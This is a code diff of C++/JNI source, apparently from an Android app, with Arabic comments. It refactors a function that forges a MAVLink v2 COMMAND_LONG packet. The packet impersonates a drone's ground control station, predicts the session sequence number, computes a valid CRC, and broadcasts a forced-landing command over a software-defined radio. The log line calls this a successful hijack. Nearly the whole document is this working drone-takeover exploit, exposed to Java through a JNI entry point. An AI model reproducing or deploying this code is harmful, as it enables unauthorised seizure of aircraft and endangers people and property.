@@ -65,48 +65,47 @@ static uint16_t crc_calculate(const uint8_t* buffer, uint16_t length) {
     return crc;
 }
 
-extern "C" {
-    // كسر مصادقة MAVLink v2 المتقدمة وإجبار الهدف على الهبوط القسري التلقائي
-    bool executeMavlinkV2Override(int last_observed_seq) {
-        uint8_t packet[128];
-        uint16_t i = 0;
+// 🛠️ [حسم التعارض]: تحويل التصدير البرمجي ليكون محلياً (static) لعدم منافسة كود الجلسة المشترك
+static bool executeMavlinkV2Override(int last_observed_seq) {
+    uint8_t packet[128];
+    uint16_t i = 0;
 
-        packet[i++] = 0xFD;             // Start Sign الخاص بالـ v2
-        packet[i++] = 33;               // Payload Length المخصصة لرسالة COMMAND_LONG
-        packet[i++] = 0x00;             // Incompatibility Flags
-        packet[i++] = 0x00;             // Compatibility Flags
-        packet[i++] = static_cast<uint8_t>((last_observed_seq + 3) % 256); // اختراق الجلسة المتزامنة
-        packet[i++] = 255;              // System ID انتحال صفة محطة التحكم الأرضية GCS
-        packet[i++] = 190;              // Component ID
+    packet[i++] = 0xFD;             // Start Sign الخاص بالـ v2
+    packet[i++] = 33;               // Payload Length المخصصة لرسالة COMMAND_LONG
+    packet[i++] = 0x00;             // Incompatibility Flags
+    packet[i++] = 0x00;             // Compatibility Flags
+    packet[i++] = static_cast<uint8_t>((last_observed_seq + 3) % 256); // اختراق الجلسة المتزامنة
+    packet[i++] = 255;              // System ID انتحال صفة محطة التحكم الأرضية GCS
+    packet[i++] = 190;              // Component ID
 
-        packet[i++] = 0x4C; packet[i++] = 0x00; packet[i++] = 0x00; // Message ID: COMMAND_LONG (76)
+    packet[i++] = 0x4C; packet[i++] = 0x00; packet[i++] = 0x00; // Message ID: COMMAND_LONG (76)
 
-        float p1 = static_cast<float>(MAV_CMD_NAV_LAND);
-        std::memcpy(&packet[i], &p1, 4); i += 4;
-        
-        float zero = 0.0f;
-        for(int x = 0; x < 6; x++) { std::memcpy(&packet[i], &zero, 4); i += 4; } 
+    float p1 = static_cast<float>(MAV_CMD_NAV_LAND);
+    std::memcpy(&packet[i], &p1, 4); i += 4;
+    
+    float zero = 0.0f;
+    for(int x = 0; x < 6; x++) { std::memcpy(&packet[i], &zero, 4); i += 4; } 
 
-        packet[i++] = 1; // Target System ID
-        packet[i++] = 1; // Target Component ID
-        packet[i++] = 0; // Confirmation code
+    packet[i++] = 1; // Target System ID
+    packet[i++] = 1; // Target Component ID
+    packet[i++] = 0; // Confirmation code
 
-        uint16_t crc = crc_calculate(packet + 1, i - 1);
-        crc = crc_accumulate(152, crc); // دمج الـ CRC-Extra لرسائل COMMAND_LONG
+    uint16_t crc = crc_calculate(packet + 1, i - 1);
+    crc = crc_accumulate(152, crc); // دمج الـ CRC-Extra لرسائل COMMAND_LONG
 
-        packet[i++] = static_cast<uint8_t>(crc & 0xFF);
-        packet[i++] = static_cast<uint8_t>((crc >> 8) & 0xFF);
+    packet[i++] = static_cast<uint8_t>(crc & 0xFF);
+    packet[i++] = static_cast<uint8_t>((crc >> 8) & 0xFF);
 
-        send_to_radio_driver(packet, i); // بث الحزمة الهجومية مباشرة عبر هوائيات الـ SDR الخارجي
-        LOGW("[EW_ATTACK] MAVLink v2 Hijack Packet Injected Successfully via SDR Transceiver Array!");
-        return true;
-    }
+    send_to_radio_driver(packet, i); // بث الحزمة الهجومية مباشرة عبر هوائيات الـ SDR الخارجي
+    LOGW("[EW_ATTACK] MAVLink v2 Hijack Packet Injected Successfully via SDR Transceiver Array!");
+    return true;
 }
 
 extern "C" {
     JNIEXPORT jboolean JNICALL
     Java_com_jamesfirstok_aegis_security_NeutralizationCore_nativeMavlinkV2Inject(
             JNIEnv* env, jobject thiz, jint last_seq) {
+        // استدعاء دالة الاختراق المعزولة محلياً بنجاح وأمان كامل
         return executeMavlinkV2Override(last_seq) ? JNI_TRUE : JNI_FALSE;
     }
 
